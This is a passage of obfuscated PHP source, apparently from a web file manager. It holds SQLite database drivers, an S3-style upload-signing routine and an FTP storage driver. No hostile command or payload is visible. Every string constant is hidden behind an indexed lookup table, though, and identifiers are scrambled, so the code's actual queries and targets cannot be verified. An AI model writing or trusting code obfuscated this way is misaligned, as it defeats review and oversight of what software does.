(!$this->_linkID) { return !1; } $this->queryStr = $²õËˆ¸; if ($this->queryID) { $this->free(); } think_action_status($©äø³ş[25], 1); think_status($©äø³ş[24]); $®™ÁÉÃö = sqlite_exec($this->_linkID, $²õËˆ¸); $this->debug(); if (!1 === $®™ÁÉÃö) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[óÔë„ú][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÔáÕ®™³ = sqlite_query($this->_linkID, $_SERVER[óÔë„ú][27]); if (!$ÔáÕ®™³) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ğÍÉÃ¡º = sqlite_query($this->_linkID, $_SERVER[óÔë„ú][28]); if (!$ğÍÉÃ¡º) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ò«®Í¸¤ = array(); if ($this->numRows > 0) { for ($ª§²¹ğô = 0; $ª§²¹ğô < $this->numRows; $ª§²¹ğô++) { $ò«®Í¸¤[$ª§²¹ğô] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ò«®Í¸¤; } public function getFields($ÅÑ³†) { $ü¦âÕáÎ =& $_SERVER[óÔë„ú]; $š¨ƒ­ÌŒ = $this->query($ü¦âÕáÎ[29] . $ÅÑ³† . $ü¦âÕáÎ[30]); $ø™ÙıçÌ = array(); if ($š¨ƒ­ÌŒ) { foreach ($š¨ƒ­ÌŒ as $¹€²Ÿî¨ => $¥©É×¶¤) { $ø™ÙıçÌ[$¥©É×¶¤[$ü¦âÕáÎ[31]]] = array($ü¦âÕáÎ[32] => $¥©É×¶¤[$ü¦âÕáÎ[31]], $ü¦âÕáÎ[33] => $¥©É×¶¤[$ü¦âÕáÎ[34]], $ü¦âÕáÎ[35] => (bool) ($¥©É×¶¤[$ü¦âÕáÎ[36]] === $ü¦âÕáÎ[12]), $ü¦âÕáÎ[37] => $¥©É×¶¤[$ü¦âÕáÎ[38]], $ü¦âÕáÎ[39] => strtolower($¥©É×¶¤[$ü¦âÕáÎ[40]]) == $ü¦âÕáÎ[41], $ü¦âÕáÎ[42] => strtolower($¥©É×¶¤[$ü¦âÕáÎ[43]]) == $ü¦âÕáÎ[44]); } } return $ø™ÙıçÌ; } public function getTables($¶–©·’Î = '') { $§Êğñ™ä =& $_SERVER[óÔë„ú]; $™ìÅß¥ = $this->query($§Êğñ™ä[45] . $§Êğñ™ä[46] . $§Êğñ™ä[47]); $¸¶Ü×­Š = array(); foreach ($™ìÅß¥ as $©Ì­²¯ï => $”®ã³‹) { $¸¶Ü×­Š[$©Ì­²¯ï] = current($”®ã³‹); } return $¸¶Ü×­Š; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $äßÎìÑ™ =& $_SERVER[óÔë„ú]; $ÏêÖıÇÂ = sqlite_last_error($this->_linkID); $this->error = $ÏêÖıÇÂ . $äßÎìÑ™[4] . sqlite_error_string($ÏêÖıÇÂ); if ($äßÎìÑ™[12] != $this->queryStr) { $this->error .= LNG($äßÎìÑ™[48]) . $this->queryStr; } think_trace($this->error, $äßÎìÑ™[12], $äßÎìÑ™[49]); return $this->error; } public function escapeString($øÚ¼—İõ) { return sqlite_escape_string($øÚ¼—İõ); } public function parseLimit($´¤©â‡¦) { $¥¾§Ú£á =& $_SERVER[óÔë„ú]; $€¬ªâ = $¥¾§Ú£á[12]; if (!empty($´¤©â‡¦)) { $´¤©â‡¦ = explode($¥¾§Ú£á[50], $´¤©â‡¦); if (count($´¤©â‡¦) > 1) { $€¬ªâ .= $¥¾§Ú£á[51] . $´¤©â‡¦[1] . $¥¾§Ú£á[52] . $´¤©â‡¦[0] . $¥¾§Ú£á[53]; } else { $€¬ªâ .= $¥¾§Ú£á[51] . $´¤©â‡¦[0] . $¥¾§Ú£á[53]; } } return $€¬ªâ; } } class DbSqlite3Base extends Db { public function __construct($¶’ªİÄ• = '') { $ì¬ô¬İÂ =& $_SERVER[óÔë„ú]; if (!class_exists($ì¬ô¬İÂ[54])) { think_exception(think_lang($ì¬ô¬İÂ[14]) . $ì¬ô¬İÂ[55]); } if (!empty($¶’ªİÄ•)) { if (!isset($¶’ªİÄ•[$ì¬ô¬İÂ[16]])) { $¶’ªİÄ•[$ì¬ô¬İÂ[16]] = 438; } $this->config = $¶’ªİÄ•; if (empty($this->config[$ì¬ô¬İÂ[17]])) { $this->config[$ì¬ô¬İÂ[17]] = array(); } } } public function connect($¼“ì—¢ = '', $È•é¦ÉÍ = 0) { $©×ñé¸Ê =& $_SERVER[óÔë„ú]; if (!isset($this->linkID[$È•é¦ÉÍ])) { if (empty($¼“ì—¢)) { $¼“ì—¢ = $this->config; } $this->linkID[$È•é¦ÉÍ] = new SQLite3($¼“ì—¢[$©×ñé¸Ê[21]]); if (!$this->linkID[$È•é¦ÉÍ]) { think_exception($this->linkID[$È•é¦ÉÍ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$È•é¦ÉÍ]->busyTimeout(30000); if (1 != think_config($©×ñé¸Ê[22])) { unset($this->config); } } return $this->linkID[$È•é¦ÉÍ]; } public function free() { $this->queryID = null; } public function query($åÜ°Â•œ) { $¶¦ºÄ“ =& $_SERVER[óÔë„ú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $åÜ°Â•œ; if ($this->queryID) { $this->free(); } think_action_status($¶¦ºÄ“[23], 1); think_status($¶¦ºÄ“[24]); $this->queryID = $this->_linkID->query($åÜ°Â•œ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Çúç¦È = $this->getAll(); $this->numRows = count($Çúç¦È); return $Çúç¦È; } } public function execute($Ê÷èñââ) { $©³³¼› =& $_SERVER[óÔë„ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ê÷èñââ; if ($this->queryID) { $this->free(); } think_action_status($©³³¼›[25], 1); think_status($©³³¼›[24]); $ø„ú£‰ = $this->_linkID->exec($Ê÷èñââ); $this->debug(); if (!1 === $ø„ú£‰) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[óÔë„ú][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Äß½¬àÖ = $this->_linkID->query($_SERVER[óÔë„ú][27]); if (!$Äß½¬àÖ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÚÌºâ” = $this->_linkID->query($_SERVER[óÔë„ú][28]); if (!$ÚÌºâ”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $•Æşîöò = array(); while ($íúÁñÜ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $•Æşîöò[] = $íúÁñÜ; } $this->queryID->reset(); return $•Æşîöò; } public function getFields($–·ˆŒœÆ) { $€ü•¹ç =& $_SERVER[óÔë„ú]; $™§Ãñè = $this->query($€ü•¹ç[29] . $–·ˆŒœÆ . $€ü•¹ç[30]); $Ç•±ğÀƒ = array(); if ($™§Ãñè) { foreach ($™§Ãñè as $‡¯¥Şµ => $–²‚ĞîÛ) { $Ç•±ğÀƒ[$–²‚ĞîÛ[$€ü•¹ç[32]]] = array($€ü•¹ç[32] => $–²‚ĞîÛ[$€ü•¹ç[32]], $€ü•¹ç[33] => $–²‚ĞîÛ[$€ü•¹ç[33]], $€ü•¹ç[35] => (bool) ($–²‚ĞîÛ[$€ü•¹ç[35]] === $€ü•¹ç[12]), $€ü•¹ç[37] => $–²‚ĞîÛ[$€ü•¹ç[56]], $€ü•¹ç[39] => (bool) $–²‚ĞîÛ[$€ü•¹ç[57]], $€ü•¹ç[42] => (bool) $–²‚ĞîÛ[$€ü•¹ç[57]]); } } return $Ç•±ğÀƒ; } public function getTables($Õ†Õ—Â = '') { $¨†·Ùšî =& $_SERVER[óÔë„ú]; $Éàùö³ú = $this->query($¨†·Ùšî[45] . $¨†·Ùšî[46] . $¨†·Ùšî[47]); $“¤øáÓÕ = array(); foreach ($Éàùö³ú as $œ†ô¯õÔ => $æõ²®ƒ³) { $“¤øáÓÕ[$œ†ô¯õÔ] = current($æõ²®ƒ³); } return $“¤øáÓÕ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $’À‡¢³µ =& $_SERVER[óÔë„ú]; $this->error = $this->_linkID->lastErrorMsg(); if ($’À‡¢³µ[12] != $this->queryStr) { $this->error .= LNG($’À‡¢³µ[48]) . $this->queryStr; } think_trace($this->error, $’À‡¢³µ[12], $’À‡¢³µ[49]); return $this->error; } public function escapeString($ö»Ù•¾) { $¿ ë¾‰Û =& $_SERVER[óÔë„ú]; if ($this->_linkID) { return $this->_linkID->escapeString($ö»Ù•¾); } return str_ireplace($¿ ë¾‰Û[58], $¿ ë¾‰Û[59], $ö»Ù•¾); } public function parseLimit($®Ô°¯») { $ùĞ„º¡Ï =& $_SERVER[óÔë„ú]; $úªÉ³ı  = $ùĞ„º¡Ï[12]; if (!empty($®Ô°¯»)) { $®Ô°¯» = explode($ùĞ„º¡Ï[50], $®Ô°¯»); if (count($®Ô°¯») > 1) { $úªÉ³ı  .= $ùĞ„º¡Ï[51] . $®Ô°¯»[1] . $ùĞ„º¡Ï[52] . $®Ô°¯»[0] . $ùĞ„º¡Ï[53]; } else { $úªÉ³ı  .= $ùĞ„º¡Ï[51] . $®Ô°¯»[0] . $ùĞ„º¡Ï[53]; } } return $úªÉ³ı ; } } goto AàÇÑãÒÖ¥; b‰æ‡‡³Á: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‡×š‰êí) { parent::__construct($‡×š‰êí); $this->setSignVersion($_SERVER[óÔë„ú][247]); } public function uploadFormData($Ğà’…ÄÍ, $èî«Ø§ä = 3600) { $—´Ú¢× =& $_SERVER[óÔë„ú]; $ƒèàëú = $—´Ú¢×[229]; $Ç­À½ÄÓ = $—´Ú¢×[270]; $í’éÊÉÄ = $—´Ú¢×[62]; $š Èìú = gmdate($—´Ú¢×[271]); $¾¾Ø = gmdate($—´Ú¢×[272]); $òü Ÿ±ş = $—´Ú¢×[273]; $´Üğ¹Õ” = $èî«Ø§ä . $—´Ú¢×[12]; $ºÌ„¾… = $—´Ú¢×[274]; $úé”µ™Ë = array($this->accessKey, $¾¾Ø, $this->region, $í’éÊÉÄ, $òü Ÿ±ş); $“ó–„íÑ = implode($—´Ú¢×[8], $úé”µ™Ë); $ù»¨¿íÇ = array($—´Ú¢×[275] => gmdate($—´Ú¢×[299], strtotime($—´Ú¢×[277])), $—´Ú¢×[278] => array(array($—´Ú¢×[279] => $this->bucket), array($—´Ú¢×[280] => $ƒèàëú), array($—´Ú¢×[281], $—´Ú¢×[282], $—´Ú¢×[12]), array($—´Ú¢×[281], $—´Ú¢×[283], $—´Ú¢×[12]), array($—´Ú¢×[281], $—´Ú¢×[284], $—´Ú¢×[12]), array($—´Ú¢×[285] => $ºÌ„¾…), array($—´Ú¢×[286] => $“ó–„íÑ), array($—´Ú¢×[287] => $Ç­À½ÄÓ), array($—´Ú¢×[288] => $š Èìú), array($—´Ú¢×[289] => $´Üğ¹Õ”))); $ Û¬íˆÒ = base64_encode(json_encode($ù»¨¿íÇ)); $ší¬áóÑ = hash_hmac($—´Ú¢×[290], $¾¾Ø, $—´Ú¢×[291] . $this->secret, !0); $êÍŞ£ñ£ = hash_hmac($—´Ú¢×[290], $this->region, $ší¬áóÑ, !0); $ŸÔ²ŒÕÛ = hash_hmac($—´Ú¢×[290], $í’éÊÉÄ, $êÍŞ£ñ£, !0); $†ÕØİ¬ = hash_hmac($—´Ú¢×[290], $òü Ÿ±ş, $ŸÔ²ŒÕÛ, !0); $›Ë²¢£ù = hash_hmac($—´Ú¢×[290], $ Û¬íˆÒ, $†ÕØİ¬); $ùÚ¯¿¦³ = array($—´Ú¢×[246] => $—´Ú¢×[12], $—´Ú¢×[292] => $—´Ú¢×[12], $—´Ú¢×[280] => $ƒèàëú, $—´Ú¢×[285] => $ºÌ„¾…, $—´Ú¢×[293] => $ Û¬íˆÒ, $—´Ú¢×[294] => $“ó–„íÑ, $—´Ú¢×[295] => $Ç­À½ÄÓ, $—´Ú¢×[296] => $š Èìú, $—´Ú¢×[297] => $´Üğ¹Õ”, $—´Ú¢×[298] => $›Ë²¢£ù, $—´Ú¢×[208] => $this->getHost()); return $ùÚ¯¿¦³; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($İ×Ê¿áË) { parent::__construct(); if (count($İ×Ê¿áË) > 0) { $this->_init($İ×Ê¿áË); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÏäËäÀ®) { $õÄŠô’ì =& $_SERVER[óÔë„ú]; global $config; $this->appCharset = $config[$õÄŠô’ì[1423]]; $this->systemCharset = $config[$õÄŠô’ì[1424]]; if (isset($ÏäËäÀ®[$õÄŠô’ì[1425]]) && $ÏäËäÀ®[$õÄŠô’ì[1425]]) { $this->systemCharset = $ÏäËäÀ®[$õÄŠô’ì[1425]]; } } public function iconvApp($Êƒª¦’ó) { return $this->iconvTo($Êƒª¦’ó, $this->systemCharset, $this->appCharset); } public function iconvSystem($×åå‚º) { return $this->iconvTo($×åå‚º, $this->appCharset, $this->systemCharset); } public function getPathOuter($„•‹êêø) { $³¿ëô†‘ =& $_SERVER[óÔë„ú]; $ºà€³øà = $this->iconvApp($this->pathBase); $„•‹êêø = $this->iconvApp($„•‹êêø); if (substr($ºà€³øà, 0, 2) == $³¿ëô†‘[1397]) { $ºà€³øà = BASIC_PATH . substr($ºà€³øà, 2); } if (substr($„•‹êêø, 0, 2) == $³¿ëô†‘[1397]) { $„•‹êêø = BASIC_PATH . substr($„•‹êêø, 2); } $ºà€³øà = KodIO::clear($ºà€³øà); $„•‹êêø = KodIO::clear($„•‹êêø); $„•‹êêø = substr($„•‹êêø, strlen($ºà€³øà)); if (empty($this->pathDriver)) { return $„•‹êêø; } return $this->pathDriver . $³¿ëô†‘[8] . ltrim($„•‹êêø, $³¿ëô†‘[8]); } private function _init($ôÚÇÛ–š = array()) { $°Ëîö¦ø =& $_SERVER[óÔë„ú]; if (!function_exists($°Ëîö¦ø[1426])) { throw new Exception(LNG($°Ëîö¦ø[1427])); } $this->config = $ôÚÇÛ–š; $this->charsetReset($ôÚÇÛ–š); foreach ($ôÚÇÛ–š as $…Âç£Ó => $–ü€ëùÊ) { if (isset($this->{$…Âç£Ó})) { $this->{$…Âç£Ó} = $–ü€ëùÊ; } } return $this->_login($ôÚÇÛ–š); } private function _login($”÷§êÁ¢) { $šü÷Ãë =& $_SERVER[óÔë„ú]; static $“¼­ÂÎ = array(); $—õ¤¯ç¼ = md5(json_encode($”÷§êÁ¢)); if (isset($“¼­ÂÎ[$—õ¤¯ç¼])) { foreach ($“¼­ÂÎ[$—õ¤¯ç¼] as $®á¶ˆ£â => $ô¤÷Ô¥¼) { $this->{$®á¶ˆ£â} = $ô¤÷Ô¥¼; } return !0; } $çûŒŞï = parse_url(trim($this->server, $šü÷Ãë[8])); $this->host = $çûŒŞï[$šü÷Ãë[208]]; $Ãµ«·– = isset($çûŒŞï[$šü÷Ãë[207]]) && $çûŒŞï[$šü÷Ãë[207]] == $šü÷Ãë[1428] ? !0 : !1; $this->scheme = $Ãµ«·– ? $šü÷Ãë[1429] : $šü÷Ãë[1430]; $this->port = isset($çûŒŞï[$šü÷Ãë[209]]) ? $çûŒŞï[$šü÷Ãë[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($šü÷Ãë[1431]) . $this->host . $šü÷Ãë[4] . $this->port, !0); return !1; } $Â¹‘Ôûæ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Â¹‘Ôûæ) { $this->writeLog(LNG($šü÷Ãë[1432]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $°ÏÈÙÂ = $this->pasv == $šü÷Ãë[91] ? !0 : !1; @ftp_pasv($this->connect, $°ÏÈÙÂ); $“¼­ÂÎ[$—õ¤¯ç¼] = array($šü÷Ãë[1433] => $this->connect, $šü÷Ãë[208] => $this->host, $šü÷Ãë[207] => $this->scheme, $šü÷Ãë[209] => $this->port); return $Â¹‘Ôûæ; } private function _isconn($³¢Êù³Ï = true) { if (is_resource($this->connect)) { return !0; } if (!$³¢Êù³Ï) { return !1; } return $this->_login($this->config); } public function mkfile($ß­ù³ø€, $µ«Ø›É = '', $ºû¾¹ö¨ = REPEAT_RENAME) { if ($this->setContent($ß­ù³ø€, $µ«Ø›É)) { return $this->getPathOuter($ß­ù³ø€); } $this->writeLog(LNG($_SERVER[óÔë„ú][1434]), !0); return !1; } public function mkdir($Å¦ˆŒ¼‹, $”ğë€ÏŠ = REPEAT_SKIP) { $–½ÄÍé” =& $_SERVER[óÔë„ú]; if (!$Å¦ˆŒ¼‹ || $Å¦ˆŒ¼‹ == $–½ÄÍé”[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Å¦ˆŒ¼‹ = $this->iconvSystem($Å¦ˆŒ¼‹); if ($this->_isFolder($Å¦ˆŒ¼‹) || @ftp_mkdir($this->connect, $Å¦ˆŒ¼‹)) { return $this->getPathOuter($Å¦ˆŒ¼‹); } if (!$this->mkdir($this->pathFather($Å¦ˆŒ¼‹))) { return !1; } if ($Å¦ˆŒ¼‹ = @ftp_mkdir($this->connect, $Å¦ˆŒ¼‹)) { return $this->getPathOuter($Å¦ˆŒ¼‹); } $this->writeLog(__FUNCTION__ . $–½ÄÍé”[1435], !0); return !1; } public function copyFile($ÈÀµˆ»», $ÜãìÕ»Å) { if (!$this->_isconn()) { return !1; } $®ÊÍˆ¨ = $this->pathThis($this->iconvSystem($ÈÀµˆ»»)); $¹–¨Şµâ = $this->tempFile($®ÊÍˆ¨); $øÍ©Ãõæ = $this->iconvApp($¹–¨Şµâ); $this->download($ÈÀµˆ»», $øÍ©Ãõæ); $æ‡¸”éÁ = $this->upload($ÜãìÕ»Å, $øÍ©Ãõæ); $this->tempFileRemve($¹–¨Şµâ); return $æ‡¸”éÁ; } public function moveFile($ÜÃ‡ª¶¦, $ÁÈğ®»¬) { if (!$this->_isconn()) { return !1; } $ÜÃ‡ª¶¦ = $this->iconvSystem($ÜÃ‡ª¶¦); $ÁÈğ®»¬ = $this->iconvSystem($ÁÈğ®»¬); $¢æ¾‰‹û = @ftp_rename($this->connect, $ÜÃ‡ª¶¦, $ÁÈğ®»¬); if (!$¢æ¾‰‹û) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); return !1; } return $this->getPathOuter($ÁÈğ®»¬); } public function delFile($üÇõÜÇó) { if (!$this->_isconn()) { return !1; } $üÇõÜÇó = $this->iconvSystem($üÇõÜÇó); $ƒ‰‰†¶ñ = @ftp_delete($this->connect, $üÇõÜÇó); if (!$ƒ‰‰†¶ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[óÔë„ú][1435], !0); } return $ƒ‰‰†¶ñ; } public function delFolder($­¿…á¶) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ôÅã’ßô = $ğ´«âÓë = array(); $this->fileList($­¿…á¶, $ôÅã’ßô, $ğ´«âÓë, !0); $this->listItemCache = !0; foreach ($ğ´«âÓë as $ÖÛÂ‘¸) { $ÂÍüÏ„´ = $this->iconvSystem($ÖÛÂ‘¸[$_SERVER[óÔë„ú][32]]); $ş·ÉÖŞ = @ftp_delete($this->connect, $ÂÍüÏ„´); if (!$ş·ÉÖŞ) { return !1; } } foreach ($ôÅã’ßô as $ÂÍüÏ„´) { $ÂÍüÏ„´ = $this->iconvSystem($ÂÍüÏ„´); $ş·ÉÖŞ = @ftp_rmdir($this->connect, $ÂÍüÏ„´); if (!$ş·ÉÖŞ) { return !1; } } $­¿…á¶ = $this->iconvSystem($­¿…á¶); return @ftp_rmdir($this->connect, $­¿…á¶); } public function rename($®Š«ÌÎ, $àû·ú¿) { $àÙ±©á½ =& $_SERVER[óÔë„ú]; if (!$this->_isconn()) { return !1; } $Îæ†° = $this->fileNameAuto($this->pathFather($®Š«ÌÎ), $àû·ú¿); $Îæ†° = $this->iconvSystem($Îæ†°); $®Š«ÌÎ = $this->iconvSystem($®Š«ÌÎ); $âÕ”Éí˜ = $this->pathFather($®Š«ÌÎ); $Çş§í™ñ = rtrim($âÕ”Éí˜, $àÙ±©á½[8]) . $àÙ±©á½[8] . $Îæ†°; $úÍÊ …¦ = @ftp_rename($this->connect, $®Š«ÌÎ, $Çş§í™ñ); if (!$úÍÊ …¦) { $this->writeLog(__FUNCTION__ . $àÙ±©á½[1435], !0); return !1; } $Çş§í™ñ = $this->iconvApp($Çş§í™ñ); return $this->getPathOuter($Çş§í™ñ); } private function folderInfo($É§óšãƒ, $Å€ÒÁ¬‘ = false) { $Ìô³ˆ†Ğ =& $_SERVER[óÔë„ú]; $½ëÙÖ©£ = array($Ìô³ˆ†Ğ[32] => $this->pathThis($É§óšãƒ), $Ìô³ˆ†Ğ[87] => $this->getPathOuter($Ìô³ˆ†Ğ[8] . $É§óšãƒ), $Ìô³ˆ†Ğ[33] => $Ìô³ˆ†Ğ[78]); if ($Å€ÒÁ¬‘) { return $½ëÙÖ©£; } $½ëÙÖ©£[$Ìô³ˆ†Ğ[231]] = $½ëÙÖ©£[$Ìô³ˆ†Ğ[88]] = 0; $½ëÙÖ©£[$Ìô³ˆ†Ğ[232]] = $½ëÙÖ©£[$Ìô³ˆ†Ğ[233]] = !0; return $½ëÙÖ©£; } private function fileInfo($¾Š®ñÃ¼, $ïèÊ®³¼ = false, $ğ£ÄÒ¤² = array()) { $«ŞáòÙ³ =& $_SERVER[óÔë„ú]; $¢£Æüø• = array($«ŞáòÙ³[32] => $this->pathThis($¾Š®ñÃ¼), $«ŞáòÙ³[87] => $this->getPathOuter($«ŞáòÙ³[8] . $¾Š®ñÃ¼), $«ŞáòÙ³[33] => $«ŞáòÙ³[230], $«ŞáòÙ³[79] => isset($ğ£ÄÒ¤²[$«ŞáòÙ³[79]]) ? $ğ£ÄÒ¤²[$«ŞáòÙ³[79]] : 0, $«ŞáòÙ³[169] => $this->ext($¾Š®ñÃ¼)); if ($ïèÊ®³¼) { return $¢£Æüø•; } $¢£Æüø•[$«ŞáòÙ³[231]] = $¢£Æüø•[$«ŞáòÙ³[88]] = 0; $¢£Æüø•[$«ŞáòÙ³[232]] = $¢£Æüø•[$«ŞáòÙ³[233]] = !0; $°†ÜË = $this->iconvSystem($¾Š®ñÃ¼); $¢£Æüø•[$«ŞáòÙ³[88]] = @ftp_mdtm($this->connect, $°†ÜË); if (empty($ğ£ÄÒ¤²)) { $ğ£ÄÒ¤² = $this->objectMeta($¾Š®ñÃ¼); if (!$ğ£ÄÒ¤²) { return $¢£Æüø•; } } $¢£Æüø•[$«ŞáòÙ³[79]] = $ğ£ÄÒ¤²[$«ŞáòÙ³[79]]; return $¢£Æüø•; } public function size($©ß´Œ¦ø) { $„Õ¬­ßÆ = $this->objectMeta($©ß´Œ¦ø); return $„Õ¬­ßÆ ? $„Õ¬­ßÆ[$_SERVER[óÔë„ú][79]] : 0; } public function info($Ã”ûÂû) { if ($this->isFile($Ã”ûÂû)) { return $this->fileInfo($Ã”ûÂû, 0); } else { if ($this->isFolder($Ã”ûÂû)) { return $this->folderInfo($Ã”ûÂû); } } return !1; } private function fileList($ã¢â×ï, &$Ç€©÷¤ù, &$ºçŒ —¹, $òÌ¨Ÿ²Ü = false) { $†Â£ºŠ¶ =& $_SERVER[óÔë„ú]; $ã¢â×ï = $this->iconvSystem($ã¢â×ï); if (!$this->isFolder($ã¢â×ï)) { return !1; } @ftp_chdir($this->connect, $†Â£ºŠ¶[8]); $ã¢â×ï = rtrim($ã¢â×ï, $†Â£ºŠ¶[8]) . $†Â£ºŠ¶[8]; check_abort(); $ûß¨æ• = @ftp_rawlist($this->connect, $ã¢â×ï); if (!$ûß¨æ•) { $ûß¨æ• = array(); } $÷ÙÔöÙ = array($†Â£ºŠ¶[10] => 1, $†Â£ºŠ¶[1350] => 1); foreach ($ûß¨æ• as $–½©Ÿç) { $İÕòìó¹ = $this->_listItem($–½©Ÿç); if ($İÕòìó¹[0] == $†Â£ºŠ¶[818]) { continue; } $Õô„™Ğ— = $İÕòìó¹[8]; if (empty($Õô„™Ğ—) && $Õô„™Ğ— !== $†Â£ºŠ¶[228] || isset($÷ÙÔöÙ[$Õô„™Ğ—])) { continue; } $Õô„™Ğ— = $this->iconvApp($ã¢â×ï . ltrim($Õô„™Ğ—, $†Â£ºŠ¶[8])); $ËÁåÁÑ¤ = array($†Â£ºŠ¶[32] => $Õô„™Ğ—, $†Â£ºŠ¶[33] => $†Â£ºŠ¶[230], $†Â£ºŠ¶[79] => $İÕòìó¹[4]); if (substr($–½©Ÿç, 0, 1) == $†Â£ºŠ¶[1436]) { $ËÁåÁÑ¤[$†Â£ºŠ¶[33]] = $†Â£ºŠ¶[78]; $ËÁåÁÑ¤[$†Â£ºŠ¶[79]] = 0; } $Ş€ãèÚ¬ = $ËÁåÁÑ¤[$†Â£ºŠ¶[33]] == $†Â£ºŠ¶[78] ? !0 : !1; $this->cacheMethodInfoSet($Õô„™Ğ—, $Ş€ãèÚ¬, $ËÁåÁÑ¤); if ($Ş€ãèÚ¬) { $Ç€©÷¤ù[] = $Õô„™Ğ—; if ($òÌ¨Ÿ²Ü) { $this->fileList($Õô„™Ğ—, $Ç€©÷¤ù, $ºçŒ —¹, $òÌ¨Ÿ²Ü); } continue; } $ºçŒ —¹[] = $ËÁåÁÑ¤; } $this->cacheMethodInfoSet($ã¢â×ï, !0); } private function _listItem($Ùù¦•ôó) { if (empty($Ùù¦•ôó)) { return array(); } $Ú«òÃøÏ = preg_split($_SERVER[óÔë„ú][1437], $Ùù¦•ôó); if (count($Ú«òÃøÏ) <= 9) { return $Ú«òÃøÏ; } $Ú«òÃøÏ[8] = trim(substr($Ùù¦•ôó, strpos($Ùù¦•ôó, $Ú«òÃøÏ[7]) + strlen($Ú«òÃøÏ[7]))); return array_splice($Ú«òÃøÏ, 0, 9); } public function listPath($Íñ´ÒŒå, $àùàÊûÒ = false) { $È™ôƒ‡Æ =& $_SERVER[óÔë„ú]; if (!$this->_isconn()) { return !1; } $À„ÈËøı = $ğõşÉ›õ = array(); $this->fileList($Íñ´ÒŒå, $À„ÈËøı, $ğõşÉ›õ); foreach ($À„ÈËøı as $ëè†á£ä => $üêåãÅİ) { $À„ÈËøı[$ëè†á£ä] = $this->folderInfo($üêåãÅİ, $àùàÊûÒ); } foreach ($ğõşÉ›õ as $ëè†á£ä => $üêåãÅİ) { $ğõşÉ›õ[$ëè†á£ä] = $this->fileInfo($üêåãÅİ[$È™ôƒ‡Æ[32]], $àùàÊûÒ, $üêåãÅİ); } return array($È™ôƒ‡Æ[85] => $À„ÈËøı, $È™ôƒ‡Æ[86] => $ğõşÉ›õ); } public function has($½×êƒûŸ, $Å™ËÀ£” = false, $ıó¡‘Ö³ = true) { $íÆŠ×ì¿ =& $_SERVER[óÔë„ú]; $‹Ô€ˆÓª = $óÀ Š = array(); $¸ÉÄ‰ñÇ = $Å™ËÀ£” ? !0 : !1; $this->fileList($½×êƒûŸ, $‹Ô€ˆÓª, $óÀ Š, $¸ÉÄ‰ñÇ); if ($Å™ËÀ£”) { return array($íÆŠ×ì¿[239] => count($óÀ Š), $íÆŠ×ì¿[240] => count($‹Ô€ˆÓª)); } if ($ıó¡‘Ö³) { if (count($óÀ Š)) { return !0; } } else { if (count($‹Ô€ˆÓª)) { return !0; } } return !1; } public function listAll($”ÆïÇ³) { $¦­ĞÁ¤ =& $_SERVER[óÔë„ú]; if (!$this->_isconn()) { return !1; } $ÄšçåÃˆ = $ ŸÂøİ = array(); $this->fileList($”ÆïÇ³, $ÄšçåÃˆ, $ ŸÂøİ, !0); $ëôÕâŸÛ = array_to_keyvalue($ ŸÂøİ, $¦­ĞÁ¤[32]); foreach ($ÄšçåÃˆ as $ îË‰÷) { if (is_string($ îË‰÷)) { $ëôÕâŸÛ[$ îË‰÷] = array($¦­ĞÁ¤[79] => 0); } } return $this->listAllFiles($”ÆïÇ³, $ëôÕâŸÛ); } public function getContent($«²àÙÚ) { if (!$this->_isconn()) { return !1; } $«²àÙÚ = $this->iconvSystem($«²àÙÚ); return $this->fileSubstr($«²àÙÚ); } public function setContent($ÅÛºÏÛ, $ƒÛ„İ¬™ = '') { if (!$this->_isconn()) { return !1; } $ÉÊÎëÎ = $this->pathThis($this->iconvSystem($ÅÛºÏÛ)); $”ø¤úÆ = $this->tempFile($ÉÊÎëÎ); file_put_contents($”ø¤úÆ, $ƒÛ„İ¬™); $Ÿóçõåµ = $this->upload($ÅÛºÏÛ, $this->iconvApp($”ø¤úÆ)); $this->tempFileRemve($”ø¤úÆ); return $Ÿóçõåµ; } public function fileSubstr($ò¹öÒ«, $È…•ñ½ò = 0, $¬ÅÆ„Šµ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ò¹öÒ«, $È…•ñ½ò, $¬ÅÆ„Šµ); } private function ftpRequest($à…˜¿¶Ò, 